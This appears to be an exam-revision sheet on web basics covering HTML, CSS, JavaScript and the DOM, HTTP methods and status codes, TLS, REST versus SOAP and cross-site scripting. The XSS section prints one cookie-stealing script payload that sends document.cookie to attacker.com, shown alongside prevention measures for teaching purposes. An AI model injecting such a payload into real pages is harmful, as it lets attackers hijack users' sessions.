ICS · Web Technology BasicsHTML basics

1HTML: Elements & Page Structure

high-yield
HTML HyperText Markup Language: the standard markup language (not a programming language) that describes the structure of a web page with tags in angle brackets. Created by Tim Berners-Lee (1991); current version HTML5 (W3C Rec. 2014, now the WHATWG "Living Standard"). Files: .html / .htm.

Element = opening tag + content + closing tag. Attribute = extra info inside the opening tag (name="value"): href, src, alt, id, class, style. Void (empty) elements have no closing tag: <br> <hr> <img> <input> <meta> <link>.

Skeleton of every page

<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <title>My Page</title> <link rel="stylesheet" href="s.css"> </head> <body> <h1>Welcome</h1> <p>Hello world.</p> </body> </html>
PartRole
<!DOCTYPE html>declaration, not a tag: tells the browser "HTML5 standards mode"
<head>metadata: <title> (browser tab), meta, CSS link, scripts
<body>everything the user sees: headings, text, images, forms
<h1>–<h6>6 heading levels; h1 largest, h6 smallest
Memory trick HTML = skeleton, CSS = skin, JS = muscles. HTML says what is there, CSS says how it looks, JS says what it does when the user acts.

3Forms & HTML5 Semantic Tags

high-yield
Form collects user input and sends it to the server: <form action="/save" method="post">. action = URL that receives the data; method = GET (data in URL) or POST (data in body). Each field needs a name to be sent.
<form action="/reg" method="post"> Name: <input type="text" name="nm"> <input type="checkbox" name="news"> Subscribe <input type="radio" name="g" value="m"> Male <input type="radio" name="g" value="f"> Female <select name="dist"> <option>Dhaka</option> <option>Khulna</option> </select> <textarea name="msg"></textarea> <button type="submit">Send</button> </form>

checkboxinput checkbox

dropdownselect+option

Memory trick Radio = one station at a time. Radio buttons sharing one name allow a single choice; checkboxes allow many.

HTML5 semantic layout

<header> intro: logo, title, nav
<nav> main navigation links
<section> thematic group with a heading
<article> independent, reusable unit (news item, blog post)
<aside> side content (sidebar, ads)
<footer> copyright, contacts
Media: <audio> <video> <source> <track>; graphics <canvas> <svg>
Exam trap Semantic tags change meaning, not looks: <section> and <div> render the same, but section tells browsers, screen readers and search engines (SEO) what the block is. <article> ≠ <section>: an article makes sense on its own.

4CSS: Ways, Selectors & the Box Model

high-yield
CSS Cascading Style Sheets controls presentation: colour, font, spacing, layout, responsiveness. Cascading = when rules conflict, priority (origin, specificity, order) decides which wins. Rule: selector { property: value; }
TypeHowUse
Inline<p style="color:red">one element; highest priority
Internal<style> … </style> in headone page
External<link rel="stylesheet" href="a.css">whole site: best, cached, reusable

Selectors

p {} element · .note {} class (many)
#top {} id (unique) · * all
div p descendant · a:hover pseudo-class
Specificity (high → low):
inline > #id > .class > element
!important beats all; equal → last rule wins.
PointPaddingMargin
Positioninside the borderoutside the border
Backgroundshows element's colouralways transparent
Separatescontent ↔ borderelement ↔ neighbours
Negative / auto?noyes (margin:auto centres)
Worked example p { width:200px; padding:20px; border:2px solid; margin:10px; } → visible box = 200 + 2×20 + 2×2 = 244 px; space taken = 244 + 2×10 = 264 px. With box-sizing: border-box the box stays 200 px.
Memory trick "My Big Pink Cat" from outside in: Margin → Border → Padding → Content. Shorthand margin: 10px 5px = top/bottom 10, left/right 5 (clockwise TRBL).

CSS frameworks = ready-made classes for fast, responsive design: Bootstrap (grid + components, class="btn btn-primary"), Tailwind CSS (utility-first, class="p-4 text-blue-600"), Foundation, Bulma. Preprocessors: Sass/LESS.

ICS · Web Technology BasicsJavaScript & DOM

5JavaScript, the DOM & Events

high-yield
JavaScript the programming language of the browser (client-side; Node.js runs it on servers). Interpreted/JIT, dynamically typed. Uses: form validation, events, DOM changes, AJAX/fetch. Added with <script>: inline or <script src="app.js">. JavaScript ≠ Java.
DOM (Document Object Model): the browser's tree of objects for the page; JS reads and changes it.
let e = document.getElementById("msg");
e.innerHTML = "Saved!"; change content
e.style.color = "red"; change style
document.getElementById("nm").value read/set an input
Also: querySelector, createElement, appendChild.

Events: onclick, onchange, onsubmit, onload, onmouseover, onkeyup. <button onclick="save()"> or btn.addEventListener("click", save).

ExpressionResultWhy
5 == "5"true== loose: converts types, then compares
5 === "5"false=== strict: value AND type, no conversion
0 == falsetruefalse → 0
null == undefinedtruebut null === undefined is false

Odd / even (if-else)

for (let x = 1; x <= 9; x++) { if (x % 2 === 0) console.log(x + " is an even value."); else console.log(x + " is an odd value."); }

10-digit phone check

function valid(p) { let d = p.replace(/\D/g, ""); return d.length === 10; }

\D = any non-digit, g = all of them.

Memory trick Three = Thorough. === checks type too; always prefer it. let/const are block-scoped, var is function-scoped.

6HTTP: Methods & Status Codes

high-yield
HTTP HyperText Transfer Protocol: application-layer, client–server, request–response protocol over TCP, default port 80. Stateless: each request is independent (cookies/sessions add state). Versions: 1.1 (persistent connections), HTTP/2 (multiplexing), HTTP/3 (over QUIC/UDP).
MethodDoesBody?Idempotent
GETread a resource (data in URL query)noyes (also safe)
POSTcreate / submit datayesno
PUTreplace whole resourceyesyes
PATCHpartial updateyesnot guaranteed
DELETEremove resourceusually noyes
ClassMeaning · common codes
1xxInformational: 100 Continue, 101 Switching Protocols
2xxSuccess: 200 OK, 201 Created, 204 No Content
3xxRedirection: 301 Moved Permanently, 302 Found (temporary), 304 Not Modified
4xxClient error: 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found
5xxServer error: 500 Internal Server Error, 502 Bad Gateway, 503 Unavailable, 504 Timeout
Exam trap 401 = not authenticated (log in first) · 403 = logged in / known but not allowed · 404 = does not exist. All three are client errors. GET is not secure: its data shows in URL, history and logs. POST hides data from the URL but is still plain text without HTTPS.
Memory trick 1 hold on · 2 here you go · 3 go away (elsewhere) · 4 you messed up · 5 I messed up.

7HTTPS/TLS, URL Anatomy, Static vs Dynamic

HTTPS = HTTP over TLS (successor of SSL), default port 443. Gives confidentiality (encryption), integrity (MAC) and authentication (server's X.509 certificate signed by a CA). Padlock in the address bar. Required for login, banking, e-government.

Asymmetric crypto only sets up the key; bulk data uses fast symmetric encryption (AES). Current version: TLS 1.3 (2018); SSL 2/3 and TLS 1.0/1.1 are deprecated.

PointStatic websiteDynamic website
Contentfixed files, same for everyonebuilt per request, per user
Server workjust sends filesruns code (PHP, Node, Java) + database
Speed / costfast, cheap, easy to hostslower, needs backend
Updateedit the HTML filevia CMS / admin panel
Exampleportfolio, brochurebank portal, e-commerce
Exam trap A static site can run JavaScript in the browser; it stays static because the server sends fixed files. "Dynamic" is about server-side generation. With only HTML + CSS you can build a static informational site (profile, notices), not login or search.
Night-before one-liners HTML = markup, HTML5 latest · page = DOCTYPE → html → head + body · void: br hr img input · button tag <button>, JS tag <script> · tr/th/td · radio = one choice · CSS: inline (top priority) · internal · external (best for a site) · box: content → padding → border → margin · inline > #id > .class > element · == converts, === doesn't · HTTP 80, HTTPS 443 (TLS) · GET read/URL, POST submit/body · 401 login, 403 forbidden, 404 missing, 500 server · REST = JSON, SOAP = XML + WSDL · XSS → encode output + HttpOnly + CSP · PHP ≠ web server.

8Web Servers, REST vs SOAP & XSS

bank favourite

Web server serves files over HTTP: Apache HTTP Server, Nginx, IIS. Application server / servlet container runs app code: Tomcat, Jetty, JBoss/WildFly. PHP is NOT a web server: it is a server-side scripting language run by Apache/Nginx.

PointRESTSOAP
Typestyle (Roy Fielding, 2000)protocol (Simple Object Access Protocol)
Data formatJSON (also XML, text)XML envelope only
TransportHTTP verbs on resource URLsmostly HTTP POST; also SMTP
Contract / securityOpenAPI optional; HTTPS + OAuth/JWTWSDL; built-in WS-Security
Used forweb & mobile appslegacy enterprise, banking integrations
XSS Cross-Site Scripting: attacker injects script into a page that other users view; it runs in their browser with the site's privileges and can steal cookies / session tokens, deface pages or act as the user. Types: Stored (saved in DB, e.g. a blog comment), Reflected (echoed from the URL), DOM-based (client JS writes input into the page).
Payload in a comment box: <script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
Prevention
① encode output: < → &lt;, > → &gt;
② validate / sanitise input (allow-list, DOMPurify)
③ textContent, not innerHTML, for user data
Defence in depth
④ HttpOnly cookies: JS cannot read them
⑤ CSP header: block inline / foreign scripts
⑥ frameworks auto-escape (React, Blade)
Memory trick XSS attacks the user, SQLi attacks the database. XSS = script runs in the victim's browser; SQL injection = query runs on the server's DB.

Written question Distinguish HTTP GET and POST, and explain the five classes of HTTP status codes with examples. 10 marks
  1. GET: reads data; parameters in the URL query (visible, bookmarkable, cached, length-limited); safe and idempotent. POST: submits data in the body (not in URL, any size, binary allowed), not idempotent; used for forms, login, upload. 4
  2. 1xx informational (100) · 2xx success (200, 201) · 3xx redirect (301, 302, 304) · 4xx client error (400, 401, 403, 404) · 5xx server error (500, 503). 5
  3. Neither GET nor POST encrypts anything: use HTTPS (TLS, port 443). 1
